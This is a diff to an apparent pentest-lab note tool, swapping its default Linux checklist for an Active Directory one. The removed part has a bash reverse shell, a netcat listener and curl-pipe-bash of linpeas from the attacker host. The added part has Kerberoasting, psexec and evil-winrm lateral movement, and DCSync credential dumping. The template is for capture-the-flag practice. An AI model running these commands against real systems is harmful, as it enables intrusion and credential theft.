@@ -185,84 +185,75 @@ html, body { height: 100%; overflow: hidden; background: var(--bg0); color: var(
 <script>
 /* ─── Default content ─────────────────────────────── */
 const DEFAULT_VARS = [
-  { key: 'TARGET_IP', value: '' },
-  { key: 'LHOST',     value: '' },
-  { key: 'LPORT',     value: '4444' },
-  { key: 'VHOST',     value: '' },
-  { key: 'USERNAME',  value: '' },
-  { key: 'PASSWORD',  value: '' },
-  { key: 'WORKDIR',   value: '/opt/oscp' },
+  { key: 'DC_IP',        value: '' },
+  { key: 'DOMAIN',       value: '' },
+  { key: 'DOMAIN_UPPER', value: '' },
+  { key: 'DOMAIN_NB',    value: '' },
+  { key: 'USERNAME',     value: '' },
+  { key: 'PASSWORD',     value: '' },
 ];
 
-const DEFAULT_MD = `# {{TARGET_IP}} — {{VHOST}}
+const DEFAULT_MD = `# AD Attack — {{DOMAIN}} ({{DC_IP}})
 
-## Phase 1 · Recon
+> Fill DC_IP, DOMAIN, DOMAIN_UPPER, DOMAIN_NB, USERNAME, PASSWORD in the panel.
+> Then import any note from htbad/ to template it against this target.
+
+## Phase 1 · Initial enumeration
 
 \`\`\`bash
-mkdir -p {{WORKDIR}}/{nmap,web,loot,exploits}
-nmap -sC -sV -p- --min-rate 5000 -oA {{WORKDIR}}/nmap/full {{TARGET_IP}}
+# DNS / SMB / LDAP surface
+nmap -sV -sC -p53,88,135,139,389,445,464,636,3268,5985 {{DC_IP}}
 \`\`\`
 
 \`\`\`bash
-# UDP top 20
-nmap -sU --top-ports 20 -oN {{WORKDIR}}/nmap/udp {{TARGET_IP}}
+# Null-session share + user hunt
+crackmapexec smb {{DC_IP}} -u '' -p '' --shares --users
 \`\`\`
 
-## Phase 2 · Web enumeration
+## Phase 2 · Credentialed enumeration
 
 \`\`\`bash
-gobuster dir -u http://{{TARGET_IP}} \\
-  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\
-  -o {{WORKDIR}}/web/gobuster.txt
-\`\`\`
-
-\`\`\`bash
-# VHost brute-force
-ffuf -u http://{{TARGET_IP}} -H 'Host: FUZZ.{{VHOST}}' \\
-  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \\
-  -mc 200,301,302,403
-\`\`\`
-
-## Phase 3 · Foothold
-
-\`\`\`bash
-# Catch shell
-nc -lvnp {{LPORT}}
+crackmapexec smb {{DC_IP}} -u {{USERNAME}} -p {{PASSWORD}} --users --groups --shares
 \`\`\`
 
 \`\`\`bash
-# Reverse shell (bash)
-bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1
+sudo bloodhound-python -u '{{USERNAME}}' -p '{{PASSWORD}}' -ns {{DC_IP}} -d {{DOMAIN}} -c all
 \`\`\`
 
-## Phase 4 · Privilege escalation
+## Phase 3 · Kerberoasting
 
 \`\`\`bash
-# Serve tools from attacker
-python3 -m http.server 8080 --directory /opt/privesc/
+GetUserSPNs.py -dc-ip {{DC_IP}} {{DOMAIN_UPPER}}/{{USERNAME}}:{{PASSWORD}} -request
 \`\`\`
 
+## Phase 4 · Lateral movement
+
 \`\`\`bash
-# Linux — grab and run linpeas
-curl -s http://{{LHOST}}:8080/linpeas.sh | bash
+# NetBIOS-style domain\\user
+psexec.py {{DOMAIN}}/{{USERNAME}}:'{{PASSWORD}}'@{{DC_IP}}
+evil-winrm -i {{DC_IP}} -u {{USERNAME}} -p '{{PASSWORD}}'
 \`\`\`
 
 \`\`\`powershell
-# Windows — grab winPEAS
-certutil -urlcache -f http://{{LHOST}}:8080/winPEASx64.exe %TEMP%\\winpeas.exe
-%TEMP%\\winpeas.exe
+runas /netonly /user:{{DOMAIN_NB}}\\{{USERNAME}} powershell
+\`\`\`
+
+## Phase 5 · Domain dominance (DCSync)
+
+\`\`\`bash
+secretsdump.py {{DOMAIN_UPPER}}/{{USERNAME}}:'{{PASSWORD}}'@{{DC_IP}} -just-dc
 \`\`\`
 
 ## Credentials
 
-| Service | User | Password | Notes |
-|---------|------|----------|-------|
-| —       | {{USERNAME}} | {{PASSWORD}} | |
+| Host | User | Password / Hash | Notes |
+|------|------|-----------------|-------|
+| {{DC_IP}} | {{USERNAME}} | {{PASSWORD}} | |
 
 ## Flags
 
-- [ ] \`/home/{{USERNAME}}/user.txt\`
-- [ ] \`/root/root.txt\`
+- [ ] user.txt
+- [ ] root.txt / Administrator
 `;
 
 /* ─── State ───────────────────────────────────────── */
